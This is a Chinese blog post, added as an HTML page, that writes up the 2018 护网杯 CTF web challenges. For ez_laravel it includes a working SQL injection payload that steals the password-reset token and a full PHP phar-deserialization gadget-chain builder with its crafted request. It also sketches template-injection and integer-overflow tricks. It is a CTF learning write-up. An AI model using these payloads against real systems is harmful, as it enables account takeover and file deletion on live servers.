@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          护网杯-web - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/10/护网杯-web/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+                        
+                    </div>
+                    <h1>护网杯-web</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-10-14
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>实力证明还是我还是最菜的那个，总之没写出来什么题，而且由于web题目都关了，复现也比较复杂，这里我也就简单记录下思路，防止以后忘了也能看下，4uuu师傅出的<code>ez_laravel</code>给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。</p>
+<p><a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="noopener">https://github.com/sco4x0/huwangbei2018_easy_laravel</a></p>
+<p>想看wp的可以看</p>
+<p><a href="http://n3k0sec.top/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFwp/#WEB" target="_blank" rel="noopener">http://n3k0sec.top/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFwp/#WEB</a></p>
+<p><a href="https://xz.aliyun.com/t/2893#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/2893#toc-15</a></p>
+<p><a href="https://xz.aliyun.com/t/2892" target="_blank" rel="noopener">https://xz.aliyun.com/t/2892</a></p>
+<p><a href="http://www.venenof.com/index.php/archives/565/" target="_blank" rel="noopener">http://www.venenof.com/index.php/archives/565/</a></p>
+<p><a href="https://www.anquanke.com/post/id/161849" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161849</a></p>
+<p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="noopener">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p>
+<p><a href="https://xz.aliyun.com/t/2897" target="_blank" rel="noopener">https://xz.aliyun.com/t/2897</a></p>
+<p>最后，web狗只复现web（因为别的也看不懂。</p>
+<h1 id="ez-tornado"><a href="#ez-tornado" class="headerlink" title="ez_tornado"></a>ez_tornado</h1><p>有个会进行验证的文件读取</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=md5(<span class="name">serect_cookie+md5</span>(<span class="name">filename</span>))</span><br></pre></td></tr></table></figure>
+<p>然后在报错页面存在模板注入，过滤了相当多的的关键字，一开始往沙箱逃逸想去了，而且没有怎么接触过tornado确实不怎么熟。</p>
+<p>最后，可以用<code></code>中获取到<code>serect_cookie</code>的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/护网杯-web/1.png" alt></p>
+<p>用这个值生成对应的<code>token</code>就可以任意文件读取获得flag</p>
+<h1 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h1><p>买辣条。一开始在寻找可以污染的输入点，发现就只有大辣条的数量接受了外部传参，然后还是做了蛮多过滤的。</p>
+<p>小辣条那里本来的钱就只够4个辣条，条件竞争，就可以买到4个以上的辣条，这样，也只是够买1个大辣条。</p>
+<p>之后就到了不会的领域。虽然看出了是go语言写的，但是无奈不会（web狗学不过来啊啊啊啊</p>
+<p>这里猜测数据类型为<code>uint64</code>，最大长度为<code>2^64-1</code></p>
+<p>这里由于是5包换一包，这样只要我们买<code>(2^64)/5+1</code>的大辣条，在判断数量的时候就会存在</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num*<span class="number">5</span> &lt; <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这样，我们就可以利用整数溢出，用5个辣条买到<code>(2^64)/5+1</code>的大辣条，也就足以买到flag</p>
+<h1 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h1><p>看wp是fast_json的命令执行，无奈java也不咋会，先空着吧</p>
+<h1 id="ez-laravel"><a href="#ez-laravel" class="headerlink" title="ez_laravel"></a>ez_laravel</h1><p>一开始在html中能看到给出了github地址，可以直接下载下源码</p>
+<p>好吧，后面就真的菜了，首先没接触过<code>laravel</code>，其次<code>composer</code>也不咋了解，只知道是个包管理器。（还是不bb了直接说解法</p>
+<p>先通过<code>composer install</code>可以下载回所有的依赖</p>
+<p>然后审计源码可以发现，登录、注册、找回密码都是用的框架的模块，从而漏洞点应该不在这几个逻辑中</p>
+<p>在<code>note</code>的功能模块中，有个比较明显的注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Note $note)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $username = Auth::user()-&gt;name;</span><br><span class="line">    $notes = DB::select(<span class="string">"SELECT * FROM `notes` WHERE `author`='&#123;$username&#125;'"</span>);</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'note'</span>, compact(<span class="string">'notes'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/护网杯-web/2.png" alt></p>
+<p>用户密码入库前肯定是做了加盐哈希等操作，所以不太可能还原密码</p>
+<p>然后就是一个找回密码的功能，找回密码的时候会设置一个token值，只有当token值和发往用户邮箱的token值一致才能重置密码，这个token值是被存放在数据库中的，但是按出题人的说法，也只有在<code>5.4</code>版本以明文的形式存储</p>
+<blockquote>
+<p>这也是使用 Laravel 5.4的原因，在高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入，就和用户密码一样</p>
+</blockquote>
+<p>然后就可以申请重置管理密码，然后得到token，（字段名和表名在<code>migrations</code>的记录里可以看到的</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asdf' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,(<span class="built_in">select</span> <span class="built_in">token</span> from password_resets),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/护网杯-web/3.png" alt></p>
+<p>然后去访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">85.144</span><span class="regexp">/password/</span>reset<span class="regexp">/85a8a09e22819c0298ce4334b6dd357a1ec51ac10335575718f218ff93faddf5</span></span><br></pre></td></tr></table></figure>
+<p>就可以修改管理员的密码</p>
+<p>然后访问<code>/flag</code>页面的时候显示的是没有<code>no flag</code>，这是由于<code>laravel</code>的页面模板缓存机制导致的</p>
+<p>提示给了<code>pop chain</code>就说明需要反序列化，可以看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $path = $request-&gt;input(<span class="string">'path'</span>, <span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    $filename = $request-&gt;input(<span class="string">'filename'</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span>($filename)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($path . $filename))&#123;</span><br><span class="line">            Flash::error(<span class="string">'磁盘文件已删除，刷新文件列表'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Flash::success(<span class="string">'文件有效'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">'files'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>file_exists($path . $filename)</code>中文件名是全部可控的，这样，就i可以利用<code>phar</code>进行反序列化，删掉模板文件，更新缓存。恰巧还有个文件上传的点</p>
+<p>然后就是寻找pop 链，自己写的代码逻辑部分不是很多，但是可以利用<code>larvael</code>中的各种类</p>
+<p><code>easy_laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php:36</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">        @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后就是构造<code>phar</code>反序列化包</p>
+<p>还有两个点就是，文件路径和缓存文件名是多少呢</p>
+<p>文件路径的化可以通过admin的note中说默认配置猜测路径为<code>/usr/share/nginx/html/</code></p>
+<p>其次就是文件名，这个可以从源码中找到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cachePath.<span class="string">'/'</span>.sha1($path).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$path的值就是模板的位置，为<code>/usr/share/nginx/html/resources/views/auth/flag.blade.php</code></p>
+<p>这样，缓存文件的文件具体路径就是<code>/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php</code></p>
+<p>就可以构造phar包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> $_filters = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_writeBuffer = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">private</span> $_mirrors = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path, $writable = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">'w+b'</span> : <span class="string">'rb'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'get_magic_quotes_runtime'</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $filePath = <span class="string">"/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($filePath === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">'Failed to retrieve temporary file name.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">parent</span>::__construct($filePath, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unlink(<span class="string">"1.phar"</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>重命名为<code>1.gif</code>上传即可，然后点击<code>check</code>，抓包修改其中的参数</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/护网杯-web/4.png" alt></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path=phar:<span class="regexp">//</span><span class="regexp">/usr/</span>share<span class="regexp">/nginx/</span>html<span class="regexp">/storage/</span>app<span class="regexp">/public&amp;filename=%2F1.gif/</span><span class="number">1</span>.txt&amp;_token=onbNiZDmpgIkhUu3Uh2z8Xlsg3vlOBfCrJgCVgql</span><br></pre></td></tr></table></figure>
+<p>就可以看到flag</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/护网杯-web/5.png" alt></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后，还记得打完N1ctf看一个老外的wp，有那么一句话</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy <span class="literal">is</span><span class="built_in"> not</span> easy</span><br></pre></td></tr></table></figure>
+<p>看来是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy <span class="keyword">is</span> never easy</span><br></pre></td></tr></table></figure>
+<p>题目还是不错的，膜4uuu师傅，本web狗已凉</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/10/phar-fastcgi-rsync-漏洞小结/" data-toggle="tooltip" data-placement="top" title="phar & fastcgi & rsync 漏洞小结">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/10/Apache-Nginx中Host头攻击的一些差异/" data-toggle="tooltip" data-placement="top" title="Apache/Nginx中Host头攻击的一些差异">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
